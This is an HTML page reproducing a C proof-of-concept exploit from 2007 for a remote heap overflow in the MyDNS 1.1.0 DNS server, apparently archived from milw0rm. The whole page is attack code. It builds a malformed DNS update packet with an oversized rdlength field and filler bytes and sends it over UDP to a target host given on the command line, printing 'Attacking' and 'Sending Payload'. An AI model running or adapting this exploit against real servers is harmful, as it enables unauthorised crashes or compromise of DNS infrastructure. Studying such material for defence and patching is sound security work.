<html><head><title>MyDNS 1.1.0 Remote Heap Overflow PoC</title></head><pre>/* mydns-rr-smash.c
 *
 * Copyright (c) 2007 by &lt;mu-b@digit-labs.org&gt;
 *
 * mydns remote exploit PoC (x86-lnx)
 * by mu-b - Apr 2007
 *
 * - Tested on: mydns-1.1.0 (.tar.gz)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define BUF_SIZE    512
#define NOP         0x41

#define DEF_PORT    53
#define PORT_DNS    DEF_PORT

static void sock_send_udp (u_char * host, int port, u_char * src, int len);
static void zbuffami (u_char * zbuf, u_char *domain);

static void
sock_send_udp (u_char * host, int port, u_char * src, int len)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_DGRAM, 0)) == -1)
    {
      perror (&quot;socket()&quot;);
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror (&quot;gethostbyname()&quot;);
      exit (-1);
    }

  memset (&amp;address, 0, sizeof (address));
  memcpy ((char *) &amp;address.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  sendto (sock, src, len, 0, (struct sockaddr *) &amp;address, sizeof (address));
}

static void
zbuffami (u_char * zbuf, u_char *domain)
{
  u_char *ptr, *bgn, *end;

  ptr = zbuf;
  *ptr++ = 0x69;  /* transaction id */
  *ptr++ = 0x69;
  *ptr++ = 0x28;  /* flags */
  *ptr++ = 0x80;
  *ptr++ = 0x00;  /* number of questions */
  *ptr++ = 0x01;
  *ptr++ = 0x00;  /* number of answers */
  *ptr++ = 0x01;
  *ptr++ = 0x00;  /* number of authority rr's */
  *ptr++ = 0x01;
  *ptr++ = 0x00;  /* number of additional rr's */
  *ptr++ = 0x00;

                  /* question */
  bgn = strtok (domain, &quot;.&quot;);
  while (bgn != NULL)
    {
      unsigned int len;

      len = strlen (bgn);
      *ptr++ = len;
      memcpy (ptr, bgn, len);
      ptr += len;

      bgn = strtok (NULL, &quot;.&quot;);
    }
  *ptr++ = 0x00;  /* terminate name */

  *ptr++ = 0x00;  /* type */
  *ptr++ = 0x06;
  *ptr++ = 0xff;  /* class */
  *ptr++ = 0xff;

                  /* update */
  *ptr++ = 0x00;  /* . */
  *ptr++ = 0x00;  /* rr-&gt;type */
  *ptr++ = 0x00;
  *ptr++ = 0x00;  /* rr-&gt;class */
  *ptr++ = 0x01;
  *ptr++ = 0xff;  /* rr-&gt;ttl */
  *ptr++ = 0xff;
  *ptr++ = 0xff;
  *ptr++ = 0xff;
  *ptr++ = 0xff;  /* rr-&gt;rdlength */
  *ptr++ = 0xff;

  /* rrdata */
  printf (&quot;NOP: %d\n&quot;, BUF_SIZE - (ptr - zbuf));
  memset (ptr, NOP, BUF_SIZE - (ptr - zbuf));
}

int
main (int argc, char **argv)
{
  int sock;
  u_char zbuf[BUF_SIZE];

  printf (&quot;mydns &lt;= 1.1.0 remote exploit PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
	  &quot;http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n&quot;);

  if (argc &lt;= 2)
    {
      fprintf (stderr, &quot;Usage: %s &lt;host&gt; &lt;update-domain&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  printf (&quot;+Attacking to %s...\n&quot;, argv[1]);

  printf (&quot;+Building evil query...&quot;);
  memset (zbuf, 0x00, sizeof (zbuf));
  zbuffami (zbuf, argv[2]);
  printf (&quot;  done\n&quot;);

  printf (&quot;+Sending Payload...&quot;);
  sock_send_udp (argv[1], PORT_DNS, zbuf, BUF_SIZE);
  printf (&quot;  done\n&quot;);
  sleep (1);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-04-27]</pre></html>